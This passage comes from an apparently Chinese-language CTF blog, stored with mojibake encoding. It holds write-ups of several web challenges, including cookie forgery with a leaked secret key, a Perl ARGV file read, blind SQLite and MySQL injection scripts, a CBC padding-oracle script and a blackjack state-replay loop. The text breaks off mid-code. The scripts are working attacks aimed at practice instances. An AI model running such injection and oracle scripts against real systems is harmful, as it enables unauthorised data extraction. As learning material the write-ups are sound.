<img src="/2020/07/09/vacation1/34.png" class="">

<p>åº”è¯¥æ˜¯ä¼ªé€ adminçš„èº«ä»½ï¼Œç›®å‰çš„é—®é¢˜å°±æ˜¯å¯†é’¥è¿˜æ²¡æ‹¿åˆ°æ‰‹ï¼Œæ‰«ä¸€å‘</p>
<img src="/2020/07/09/vacation1/35.png" class="">

<p>æœ‰robots.txtï¼Œè®¿é—®ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Disallow: &#x2F;static&#x2F;secretkey.txt</span><br></pre></td></tr></table></figure>

<p>è®¿é—®ï¼Œæ‹¿åˆ°å¯†é’¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">you-will-never-guess</span><br></pre></td></tr></table></figure>

<p>åŠ å¯†ï¼Œæ›¿æ¢cookie</p>
<img src="/2020/07/09/vacation1/36.png" class="">

<p>æœ‰flag.pngï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ï¼ŒæŸ¥æ‰¾äº†curlå‘½ä»¤ï¼Œæ‰¾åˆ°äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-i&#x2F;--include                    è¾“å‡ºæ—¶åŒ…æ‹¬protocolå¤´ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<img src="/2020/07/09/vacation1/37.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>vacation2</title>
    <url>/2020/07/11/vacation2/</url>
    <content><![CDATA[<h3 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id<a id="more"></a></h3><p>perlparam()ä»»æ„æ–‡ä»¶è¯»å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($cgi-&gt;upload(&#39;file&#39;)) &#123;</span><br><span class="line">    my $file &#x3D; $cgi-&gt;param(&#39;file&#39;);</span><br><span class="line">    while (&lt;$file&gt;) &#123;</span><br><span class="line">        print &quot;$_&quot;;</span><br><span class="line">        print &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„fileå˜é‡ä¸­ã€‚è€Œå¯¹äºä¸‹é¢çš„è¯»æ–‡ä»¶é€»è¾‘æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨æ–¹æ³•å°±å‡ºç°äº†ï¼šåœ¨æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶å‰é¢åŠ ä¸Šä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡¹ARGVï¼Œç„¶ååœ¨URLä¸­ä¼ å…¥æ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œè¿™æ ·å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶äº†ã€‚</span><br></pre></td></tr></table></figure>

<img src="/2020/07/11/vacation2/1.png" class="">

<h3 id="BSidesCF-2019-Sequel"><a href="#BSidesCF-2019-Sequel" class="headerlink" title="[BSidesCF 2019]Sequel"></a>[BSidesCF 2019]Sequel</h3><p>æ‰“å¼€æ˜¯ç™»å½•æ¡†ï¼Œå°è¯•æ³¨å…¥æŠ¥é”™åªèƒ½è¾“å…¥å­—æ¯æˆ–æ•°å­—ï¼Œåº”è¯¥æ˜¯å¼±å¯†ç çˆ†ç ´äº†</p>
<img src="/2020/07/11/vacation2/2.png" class="">

<p>çˆ†å‡ºè´¦å·å’Œå¯†ç éƒ½æ˜¯guestï¼Œç™»å½•ï¼Œcookieå‘ç”Ÿäº†æ”¹å˜ï¼Œè§£ç çœ‹çœ‹</p>
<img src="/2020/07/11/vacation2/3.png" class="">

<p>jsonå½¢å¼è®°å½•çš„ä¿¡æ¯ï¼Œç½‘é¡µæç¤ºadminæ‰èƒ½å¤Ÿçœ‹åˆ°ä¿¡æ¯ï¼Œé‚£åº”è¯¥å°±æ˜¯è¦æ³¨å‡ºadminçš„è´¦å·ä¿¡æ¯äº†ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œåæ¥æ€ä¹ˆéƒ½ä¸è¡Œï¼Œå»çœ‹äº†wpï¼Œæ‰çŸ¥é“æ˜¯sqliteæ³¨å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> string.printable:</span><br><span class="line">        tmp = out + letter</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> letter == <span class="string">'g'</span>: <span class="keyword">continue</span></span><br><span class="line">        payload2 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line">        payload1 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT password FROM userinfo WHERE password LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line">        payload3 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT username FROM userinfo WHERE username LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line"></span><br><span class="line">        payload1 = base64.b64encode(payload1.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        payload2 = base64.b64encode(payload2.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        payload3 = base64.b64encode(payload3.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        r = requests.get(<span class="string">'http://7e95f711-c309-4bfa-b522-a0be0d9d6b06.node3.buuoj.cn/sequels'</span>, cookies=&#123;<span class="string">"1337_AUTH"</span> : payload1&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Movie"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            out = tmp</span><br><span class="line">            sys.stdout.write(letter)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>payload2æ³¨å‡ºè¡¨åæ˜¯userinfo,payload1å’Œpayload3åˆ†åˆ«èƒ½å¤Ÿæ³¨å‡ºå¯†ç å’Œç”¨æˆ·åï¼Œç™»å½•å°±èƒ½æ‹¿åˆ°flag</p>
<h3 id="NPUCTF2020-webğŸ•"><a href="#NPUCTF2020-webğŸ•" class="headerlink" title="[NPUCTF2020]webğŸ•"></a>[NPUCTF2020]webğŸ•</h3><p>å¯¹äºwebcryptoçœŸçš„æ˜¯ä¸€ç‚¹åŠæ³•éƒ½æ²¡æœ‰ï¼Œå¯†ç å­¦å¤ªéš¾äº†23333</p>
<p>è¿™ä¸ªwpå†™çš„æŒºå¥½çš„ï¼Œ<a href="http://wh1sper.cn/padding-oracle-attackcbcå­—èŠ‚ç¿»è½¬æ”»å‡»/" target="_blank" rel="noopener">http://wh1sper.cn/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a></p>
<p>è¯¦ç»†çš„å°±ä¸è¯´äº†ï¼Œè´´ä¸€ä¸‹è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'\x97.\xda\xb8\xa5P\t\x95\xae\x9b\xf5\xbf\xe2\x8b.&lt;'</span></span><br><span class="line">CYPHERTEXT = base64.b64decode(<span class="string">"ly7auKVQCZWum/W/4osuPA=="</span>)</span><br><span class="line"><span class="comment"># initialization vector</span></span><br><span class="line">IV = <span class="string">"6666666666666666"</span></span><br><span class="line"><span class="comment"># PKCS7 16ä¸ªå­—èŠ‚ä¸º1ç»„</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line"><span class="comment"># intermediaryValue ^ IV = plainText</span></span><br><span class="line">inermediaryValue = <span class="string">""</span></span><br><span class="line">plainText = <span class="string">""</span></span><br><span class="line"><span class="comment"># çˆ†ç ´æ—¶ä¸æ–­éœ€è¦æ›´æ”¹çš„iv</span></span><br><span class="line">iv = <span class="string">""</span></span><br><span class="line">URL = <span class="string">"http://e2806171-574c-4b88-a59c-74cfbb5d13cb.node3.buuoj.cn/index.php?method=decrypt&amp;source=1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ç”¨äºè¾“å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹ä½å¼‚æˆ–çš„ç»“æœ</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i])) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> range(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">    padding = chr(step) * (step - <span class="number">1</span>)</span><br><span class="line">    print(step,end=<span class="string">","</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        ivç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</span></span><br><span class="line"><span class="string">            å¾…çˆ†ç ´ä½ç½® chr(0)*(N-step)</span></span><br><span class="line"><span class="string">            æ­£åœ¨çˆ†ç ´ä½ç½® chr(i)</span></span><br><span class="line"><span class="string">            ä½¿ iv[N-step+1:] ^ inermediaryValue = padding çš„ xor(padding,inermediaryValue)</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        iv = chr(<span class="number">0</span>)*(N-step)+chr(i)+xor(padding,inermediaryValue)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"data"</span>: <span class="string">"ly7auKVQCZWum/W/4osuPA=="</span>,</span><br><span class="line">            <span class="string">"iv"</span>: iv</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(URL,data = data)</span><br><span class="line">        <span class="keyword">if</span> r.text !=<span class="string">"False"</span>:</span><br><span class="line">            inermediaryValue = xor(chr(i),chr(step)) + inermediaryValue</span><br><span class="line">            print(inermediaryValue)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">plainText = xor(inermediaryValue,IV)</span><br><span class="line">print(plainText)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºFlagIsHere.php,è®¿é—®ï¼Œè¿˜æ˜¯ä¸€å±‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span><span class="params">(b1, b2)</span>:</span> <span class="comment"># use xor for bytes</span></span><br><span class="line">    parts = []</span><br><span class="line">    <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> zip(b1, b2):</span><br><span class="line">        parts.append(bytes([b1 ^ b2]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.join(parts)</span><br><span class="line">iv = base64.b64decode(<span class="string">"979H6BtnbZagkjEBT316rA=="</span>)</span><br><span class="line">text = <span class="string">b"piapiapiapia\x04\x04\x04\x04"</span></span><br><span class="line">result = <span class="string">b"weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"</span></span><br><span class="line">middle = bxor(iv,text)</span><br><span class="line">iv = bxor(middle,result)</span><br><span class="line">print(base64.b64encode(iv))</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºçš„ivçš„å€¼postè¿‡å»ï¼Œä¼šç»™æç¤ºï¼Œbuuä¸Šç›´æ¥ä¸‹è½½é™„ä»¶ï¼Œæ˜¯javaåç¼–è¯‘ï¼Œç”¨Luyten-masteråç¼–è¯‘ï¼ŒGitHubï¼š<a href="https://github.com/deathmarine/Luyten/releaseså¼€ç®±å³ç”¨" target="_blank" rel="noopener">https://github.com/deathmarine/Luyten/releaseså¼€ç®±å³ç”¨</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] array)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"\u4f17\u6240\u5468\u77e5\uff0c\u4f60\u662f\u4e00\u540dWEB\u9009\u624b\uff0c\u638c\u63e1javaweb\u4e5f\u662f\u4e00\u9879\u5fc5\u5907\u6280\u80fd\uff0c\u90a3\u4e48\u9006\u5411\u4e2ajava\u5e94\u8be5\u4e0d\u8fc7\u5206\u5427\uff1f"</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] array2 = &#123; <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æŠŠå¯¹åº”çš„asciiå€¼è½¬æ¢æˆå­—ç¬¦æ‹¼æ¥å°±æ˜¯äº†</p>
<img src="/2020/07/11/vacation2/4.png" class="">

<h3 id="b01lers2020-Space-Noodles"><a href="#b01lers2020-Space-Noodles" class="headerlink" title="[b01lers2020]Space Noodles"></a>[b01lers2020]Space Noodles</h3><p>è¿™é“é¢˜æŒºæ²¡æ„æ€çš„ï¼Œå°±æ˜¯è€ƒhttpä¸åŒçš„ä¼ è¾“æ–¹æ³•ï¼Œç›´æ¥é™„ä¸Šä¸€ç¯‡wpï¼š<a href="https://ctftime.org/writeup/19141" target="_blank" rel="noopener">https://ctftime.org/writeup/19141</a></p>
<hr>
<p>ä¸­é—´åœäº†å¥½å¤šå¤©æ²¡åšé¢˜äº†ï¼Œå»å‡†å¤‡ä¸€ä¸ªä¸Šè¯¾çš„ä¸œè¥¿å»äº†ï¼Œé‚£è¾¹è¦æ±‚ï¼Œæ”¹æ¥æ”¹å»çš„ï¼Œæäº†å¥½å¤šå¤©ï¼Œæ€»ç®—å‡†å¤‡å®Œäº†ï¼Œåå¤©è½®åˆ°ä¸Šè¯¾ï¼Œè¿™ä¸¤å¤©å¾—ç»§ç»­è‡ªå·±çš„äº‹äº†</p>
<h3 id="BSidesCF-2020-Cards"><a href="#BSidesCF-2020-Cards" class="headerlink" title="[BSidesCF 2020]Cards"></a>[BSidesCF 2020]Cards</h3><p>è¿™é“é¢˜ä¸çŸ¥é“å’‹å›äº‹ï¼Œæ‰“å¼€å•¥éƒ½æ²¡æœ‰ï¼Œç©ä¸äº†è¿™ä¸ª21ç‚¹ï¼Œåªèƒ½æ˜¯å€Ÿé‰´ä¸€ä¸‹wpå†™ä¸€ä¸‹äº†</p>
<p>æ¯ä¸ªè¯·æ±‚éƒ½æœ‰SecretStateå‚æ•°ï¼Œä¿å­˜æ¸¸æˆå½“å‰çŠ¶æ€ï¼Œæ¯æ¬¡è¯·æ±‚ä¹‹åä¼šç”Ÿæˆæ–°çš„SecretState</p>
<p>æ¸¸æˆèµ¢äº†æ›´æ–°SecretStateï¼Œå¦åˆ™ä¸æ›´æ–°</p>
<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ä¸‹æ³¨ä¹‹åå¼€ç‰Œè¦ç”¨æ–°çš„SecretStateï¼Œä¸‹æ³¨æ—¶åˆ†æ•°å·²ç»æ‰£é™¤äº†</p>
<p>åˆ©ç”¨21ç‚¹è§„åˆ™ï¼Œä¸¤å¼ ç‰Œå·²ç»æ˜¯21ç‚¹ï¼Œç›´æ¥å°±èµ¢äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">start &#x3D; &quot;http:&#x2F;&#x2F;0c168e61-9d77-44d8-8a66-56e77d85d52a.node3.buuoj.cn&#x2F;api&quot;</span><br><span class="line">deal &#x3D; start + &quot;&#x2F;deal&quot;</span><br><span class="line">proxy &#x3D; &#123;&quot;https&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:1087&#x2F;&quot;&#125;#è®¾ç½®æœ¬åœ°ä¸ºä»£ç†</span><br><span class="line"># å¼€å±€</span><br><span class="line">state &#x3D; requests.post(start, proxies&#x3D;proxy).json()[&quot;SecretState&quot;]</span><br><span class="line">while True:</span><br><span class="line">    # ä¸‹æ³¨</span><br><span class="line">    try:</span><br><span class="line">        resp &#x3D; requests.post(deal, json&#x3D;&#123;&quot;Bet&quot;: 500, &quot;SecretState&quot;: state&#125;, proxies&#x3D;proxy).json()</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    if resp[&#39;GameState&#39;] &#x3D;&#x3D; &#39;Blackjack&#39;:</span><br><span class="line">        state &#x3D; resp[&#39;SecretState&#39;]</span><br><span class="line">    # print(resp[&#39;Balance&#39;])</span><br><span class="line">    if resp[&#39;Balance&#39;] &gt; 100000:</span><br><span class="line">        print(resp)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<img src="/2020/07/11/vacation2/5.png" class="">

<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>source.zipä¸‹è½½æºç ï¼Œçœ‹åˆ°é‡ç‚¹éƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>($_SESSION) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">"Direct access on this script is not allowed!"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'db.php'</span>;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">'SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`="'</span> . $_GET[<span class="string">'username'</span>] . <span class="string">'" and password="'</span> . md5($_GET[<span class="string">'password'</span>]) . <span class="string">'";'</span>;</span><br><span class="line">$result = $con-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $user;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">($result-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> $row = $result-&gt;fetch_assoc() <span class="keyword">AND</span> $con-&gt;close() <span class="keyword">AND</span> auth($row[<span class="string">'username'</span>]) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">'&lt;meta http-equiv="refresh" content="0; url=?p=home" /&gt;'</span>)) <span class="keyword">OR</span> ($con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">'Try again!'</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨login.phpä¸­å¯¹sessionè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœæ²¡æœ‰å°±die</p>
<p>php.iniä¸­æœ‰ä¸€äº›å…³äºsessionçš„é…ç½®ï¼š<br>è‹¥session.auto_start=onï¼Œå°±ä¼šè‡ªåŠ¨sessionåˆå§‹åŒ–ï¼Œä½†æ˜¯é»˜è®¤æ˜¯offçš„<br>è¿˜æœ‰ä¸€ä¸ªï¼šPHP_SESSION_UPLOAD_PROGRESSæ˜¯é»˜è®¤å¼€å¯çš„ï¼Œçœ‹ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£</p>
<img src="/2020/07/11/vacation2/6.png" class="">

<p>è¿™ä¸ªæ˜¯ç”¨æ¥æ£€æµ‹æ–‡ä»¶ä¸Šä¼ è¿›åº¦çš„ï¼Œå¦‚æœåŒæ—¶ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”POSTä¸€ä¸ªåŒåå˜é‡PHP_SESSION_UPLOAD_PROGRESSï¼Œé‚£ä¹ˆå°±ä¼šåœ¨_SESSIONä¸­è·å–ä¸Šä¼ è¿›åº¦</p>
<p>æ„é€ postè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://cec2b7d6-c5ce-4db1-917c-2231ccc67bce.node3.buuoj.cn/templates/login.php'</span></span><br><span class="line">files=&#123;<span class="string">"file"</span>:<span class="string">"123"</span>&#125;</span><br><span class="line">data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">"123"</span>&#125;</span><br><span class="line">cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"123"</span>&#125;</span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">130</span>):</span><br><span class="line">        params=&#123;<span class="string">"username"</span>:<span class="string">'test" or (ascii(substr((select group_concat(secret) from flag_tbl),'</span>+str(b)+<span class="string">',1))='</span>+str(i)+<span class="string">')#'</span>,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"test"</span>&#125;</span><br><span class="line">        a=requests.post(url=url,files=files,data=data,cookies=cookies,params=params).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'meta'</span> <span class="keyword">in</span> a:</span><br><span class="line">            text += chr(i)</span><br><span class="line">            print(text)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè„šæœ¬é€Ÿåº¦å¾ˆæ…¢ï¼Œå¯ä»¥æ”¹æˆäºŒåˆ†æ³•</p>
<h2 id="Zer0pts2020-phpNantokaAdmin"><a href="#Zer0pts2020-phpNantokaAdmin" class="headerlink" title="[Zer0pts2020]phpNantokaAdmin"></a>[Zer0pts2020]phpNantokaAdmin</h2><p>å¼€é¢˜ï¼Œæ˜¯è¿™æ ·çš„é¡µé¢</p>
<img src="/2020/07/11/vacation2/7.png" class="">

<p>å¯ä»¥åˆ›å»ºä¸€ä¸ªè¡¨å¹¶ä¸”å¾€é‡Œé¢æ·»åŠ æ•°æ®ï¼Œæ˜¯sqlæ³¨å…¥æ²¡è·‘äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯å“ªä¸ªæ•°æ®åº“ï¼ŒçŒœæµ‹ä¸æ˜¯mysql</p>
<p>dirsearchæ‰«ä¸€ä¸‹ç›®å½•</p>
<img src="/2020/07/11/vacation2/8.png" class="">

<p>è¿™ä¸¤ä¸ªé¡µé¢éƒ½æ²¡æœ‰å›æ˜¾ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆæ‹¿æºç ï¼Œè¯¥è¯•çš„éƒ½è¯•è¿‡äº†ï¼Œç›´æ¥Gitlabæ‰’ä¸‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'util.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$method = (string) ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] ?? <span class="string">'GET'</span>);</span><br><span class="line">$page = (string) ($_GET[<span class="string">'page'</span>] ?? <span class="string">'index'</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array($page, [<span class="string">'index'</span>, <span class="string">'create'</span>, <span class="string">'insert'</span>, <span class="string">'delete'</span>])) &#123;</span><br><span class="line">  redirect(<span class="string">'?page=index'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$message = $_SESSION[<span class="string">'flash'</span>] ?? <span class="string">''</span>;</span><br><span class="line"><span class="keyword">unset</span>($_SESSION[<span class="string">'flash'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_array($page, [<span class="string">'insert'</span>, <span class="string">'delete'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SESSION[<span class="string">'database'</span>])) &#123;</span><br><span class="line">  flash(<span class="string">"Please create database first."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'database'</span>])) &#123;</span><br><span class="line">  $pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:db/'</span> . $_SESSION[<span class="string">'database'</span>]);</span><br><span class="line">  $stmt = $pdo-&gt;query(<span class="string">"SELECT name FROM sqlite_master WHERE type='table' AND name &lt;&gt; '"</span> . FLAG_TABLE . <span class="string">"' LIMIT 1;"</span>);</span><br><span class="line">  $table_name = $stmt-&gt;fetch(PDO::FETCH_ASSOC)[<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">  $stmt = $pdo-&gt;query(<span class="string">"PRAGMA table_info(`&#123;$table_name&#125;`);"</span>);</span><br><span class="line">  $column_names = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($page === <span class="string">'insert'</span> &amp;&amp; $method === <span class="string">'POST'</span>) &#123;</span><br><span class="line">  $values = $_POST[<span class="string">'values'</span>];</span><br><span class="line">  $stmt = $pdo-&gt;prepare(<span class="string">"INSERT INTO `&#123;$table_name&#125;` VALUES (?"</span> . str_repeat(<span class="string">',?'</span>, count($column_names) - <span class="number">1</span>) . <span class="string">")"</span>);</span><br><span class="line">  $stmt-&gt;execute($values);</span><br><span class="line">  redirect(<span class="string">'?page=index'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($page === <span class="string">'create'</span> &amp;&amp; $method === <span class="string">'POST'</span> &amp;&amp; !<span class="keyword">isset</span>($_SESSION[<span class="string">'database'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'table_name'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'columns'</span>])) &#123;</span><br><span class="line">    flash(<span class="string">'Parameters missing.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $table_name = (string) $_POST[<span class="string">'table_name'</span>];</span><br><span class="line">  $columns = $_POST[<span class="string">'columns'</span>];</span><br><span class="line">  $filename = bin2hex(random_bytes(<span class="number">16</span>)) . <span class="string">'.db'</span>;</span><br><span class="line">  $pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:db/'</span> . $filename);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_valid($table_name)) &#123;</span><br><span class="line">    flash(<span class="string">'Table name contains dangerous characters.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (strlen($table_name) &lt; <span class="number">4</span> || <span class="number">32</span> &lt; strlen($table_name)) &#123;</span><br><span class="line">    flash(<span class="string">'Table name must be 4-32 characters.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (count($columns) &lt;= <span class="number">0</span> || <span class="number">10</span> &lt; count($columns)) &#123;</span><br><span class="line">    flash(<span class="string">'Number of columns is up to 10.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $sql = <span 